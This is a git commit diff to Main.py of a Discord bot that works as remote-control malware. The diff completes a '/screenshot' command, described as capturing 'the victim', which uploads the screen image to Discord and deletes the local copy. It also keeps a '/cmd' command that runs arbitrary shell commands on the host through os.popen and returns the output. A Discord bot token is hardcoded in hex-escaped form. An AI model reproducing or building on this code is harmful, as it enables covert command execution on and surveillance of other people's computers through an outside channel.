e8f0a92e147daf740367afaee52bcf66886caa99
Swe4r <botmail274@gmail.com>
2022-10-11 22:55:06 +0200

    screeenshot

--- Main.py
+++ Main.py
@@ -7,14 +7,6 @@ import discord
 import pyautogui
 from discord import *
 
-"""
-@client.event
-async def on_message(message):
-    channelid = message.channel.id
-    name = message.author.name
-    tag = "#"+message.author.discriminator
-    print (f"channel :{channelid} -> {name}{tag} : {message.content}")
-"""
 
 global Token
 Token = "\x4d\x54\x41\x78\x4e\x44\x63\x77\x4e\x7a\x51\x33\x4e\x6a\x67\x35\x4e\x54\x45\x78\x4e\x7a\x4d\x33\x4e\x41\x2e\x47\x53\x34\x57\x58\x50\x2e\x72\x41\x37\x62\x6d\x4a\x67\x4d\x6a\x52\x32\x78\x34\x70\x44\x35\x67\x30\x4d\x52\x69\x47\x72\x74\x73\x47\x74\x66\x6d\x2d\x63\x4b\x79\x63\x6e\x42\x46\x73"
@@ -41,20 +33,22 @@ async def on_ready():
 @bot.tree.command(name="cmd", description="execute command in cmd")
 async def cmd(interaction: discord.Interaction, command: str):
 	await interaction.response.send_message(f"executing command {command}...")
+
 	x = os.popen(command).read()
-	print(x)
+
 	if x == "":
-		await interaction.channel.send("Command not valid")
+		await interaction.channel.send("Command doesn't return anything/ isn't valid")
 	else:
 		await interaction.channel.send(f"command {command} returned:\n ```{x}```")
-		#await interaction.channel.send(f"Command `{command}` returned: ```{os.popen(command).read()}```")
-
 
 
 @bot.tree.command(name="screenshot", description="get a screenshot of the victim")
 async def ping(interaction: discord.Interaction):
 	name, path = takeScreenshot()
-	await interaction.response.send_message()
+	await interaction.response.send_message(f"Screenshot taken, sending...")
+	await interaction.channel.send(file=discord.File(path))
+	print(path)
+	os.remove(path)
 
 
 def takeScreenshot():
